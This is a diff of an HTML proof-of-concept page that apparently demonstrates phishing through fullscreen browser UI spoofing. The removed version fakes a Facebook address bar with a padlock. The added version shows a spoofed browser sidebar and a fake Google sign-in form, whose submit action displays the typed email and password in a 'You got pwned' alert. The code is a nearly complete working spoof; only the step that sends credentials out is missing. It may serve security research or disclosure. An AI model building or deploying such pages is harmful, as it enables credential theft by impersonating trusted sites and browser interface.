@@ -1,142 +1,130 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Login To Facebook</title>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      font-family: sans-serif;
-      background: #ffffff;
-    }
-    .addressbar-spoof {
-      position: fixed;
-      top: 0;
-      left: 0;
-      height: 40px;
-      width: 100%;
-      background: #f1f1f1;
-      display: flex;
-      align-items: center;
-      padding-left: 10px;
-      font-size: 14px;
-      z-index: 9999;
-    }
-    .secure {
-      color: green;
-      font-weight: bold;
-      margin-right: 6px;
-    }
-    iframe {
-      position: absolute;
-      top: 40px;
-      left: 0;
-      width: 100%;
-      height: calc(100% - 40px);
-      border: none;
-    }
-    #trigger {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 18px;
-      padding: 20px;
-      background: #111;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    
-    /* Sidebar styling */
-    .sidebar {
-      position: fixed;
-      top: 40px;
-      left: 0;
-      width: 200px;
-      height: calc(100% - 40px);
-      background-color: #f0f2f5;
-      padding: 20px;
-      box-sizing: border-box;
-      display: none;
-      z-index: 9998;
-      overflow-y: auto;
-    }
-    
-    .sidebar img {
-      width: 100%;
-      border-radius: 8px;
-      margin-bottom: 15px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    
-    .sidebar-content {
-      margin-top: 20px;
-    }
-    
-    .sidebar-content h3 {
-      margin: 0 0 10px 0;
-      color: #1c1e21;
-      font-size: 16px;
-    }
-    
-    .sidebar-content p {
-      margin: 0;
-      color: #65676b;
-      font-size: 14px;
-      line-height: 1.4;
-    }
-    
-    /* Adjust iframe when sidebar is visible */
-    .sidebar-visible + iframe {
-      left: 200px;
-      width: calc(100% - 200px);
-    }
-  </style>
-</head>
-<body>
 
-<button id="trigger">CLICK TO OPEN FACEBOOK</button>
+<body><center><br><img id=img style="cursor: pointer;" src=https://cdn.prod.website-files.com/5c2a9a234fdbba7439c48fa4/632cc665abbc286ce8f3e896_Screen%20Shot%202022-09-22%20at%204.11.09%20PM.webp onclick=start();>
 
 <script>
-  const trigger = document.getElementById("trigger");
 
-  trigger.onclick = () => {
-    document.body.innerHTML = `
-      <div class="addressbar-spoof">
-        <span class="secure">🔒</span> https://facebook.com
-      </div>
-      <div class="sidebar">
-        <img src="my-poc.png" alt="Gambar Sidebar">
-        <div class="sidebar-content">
-          <h3>Stay Connected</h3>
-          <p>Connect with friends and the world around you on Facebook.</p>
+
+function start(){
+document.body.innerHTML=`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simplified Site Layout</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            display: flex;
+            height: 100%;
+        }
+        .sidebar {
+            width: 250px;
+            color: white;
+        }
+        .main-content {
+            flex-grow: 1;
+            padding: 20px;
+        }
+        .sidebar img {
+            width: 100%;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar">
+            <img src="https://frozzipies.github.io/arc_sidebar.png" alt="Sidebar content">
         </div>
-      </div>
-      <iframe src="test3.html"></iframe>
-    `;
-    
-    // Request fullscreen and show sidebar
-    document.documentElement.requestFullscreen().then(() => {
-      // Show sidebar only in fullscreen mode
-      document.querySelector('.sidebar').style.display = 'block';
-      document.querySelector('.sidebar').classList.add('sidebar-visible');
-    }).catch(console.error);
-    
-    // Listen for fullscreen exit to hide sidebar
-    document.addEventListener('fullscreenchange', () => {
-      const sidebar = document.querySelector('.sidebar');
-      if (!document.fullscreenElement) {
-        sidebar.style.display = 'none';
-        sidebar.classList.remove('sidebar-visible');
-      } else {
-        sidebar.style.display = 'block';
-        sidebar.classList.add('sidebar-visible');
-      }
-    });
-  };
-</script>
-
+        <div class="main-content">
+            <!-- Main content area -->
+            <iframe width=1000 height=1000 srcdoc='<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f1f1f1;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        input[type="submit"]:hover {
+            background-color: #357ae8;
+        }
+        .google-logo {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <h1>Sign in</h1>
+        <form action="javascript:alert(\`You got pwned ;)\\nEmail: \`+email.value+\`\\nPassword: \`+pass.value)">
+            <input id=email type="email" placeholder="Email" required>
+            <input id=pass type="password" placeholder="Password" required>
+            <input type="submit" value="Login">
+        </form>
+    </div>
 </body>
-</html>
+</html>'></iframe>
+        </div>
+    </div>
+</body>
+</html>`
+document.body.requestFullscreen();
+
+}
+
+
+</script>
